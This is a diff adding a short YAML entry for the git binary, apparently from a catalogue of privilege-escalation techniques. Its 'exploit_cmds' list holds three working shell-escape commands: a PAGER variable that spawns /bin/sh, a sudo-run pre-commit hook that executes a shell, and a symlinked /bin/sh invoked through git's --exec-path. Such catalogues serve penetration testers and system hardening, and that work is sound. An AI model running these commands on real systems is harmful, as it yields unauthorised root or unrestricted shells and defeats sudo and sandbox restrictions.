@@ -1,0 +1,7 @@
+name: git
+binary_path: /usr/bin/git
+exploit_cmds:
+- PAGER='/bin/sh -c "exec sh 0<&1"' /usr/bin/git -p help
+- sudo /usr/bin/git init . && echo 'exec /bin/sh 0<&2 1>&2' >.git/hooks/pre-commit
+  && chmod +x .git/hooks/pre-commit && /usr/bin/git -C . commit --allow-empty -m x
+- ln -s /bin/sh git-x && sudo /usr/bin/git --exec-path=. x
